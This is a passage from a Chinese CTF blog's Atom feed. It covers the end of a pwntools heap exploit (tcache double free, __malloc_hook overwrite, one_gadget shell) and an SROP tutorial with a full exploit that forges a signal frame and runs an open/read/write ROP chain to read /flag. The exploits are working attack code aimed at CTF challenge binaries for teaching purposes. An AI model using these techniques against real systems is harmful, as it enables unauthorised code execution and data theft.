class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
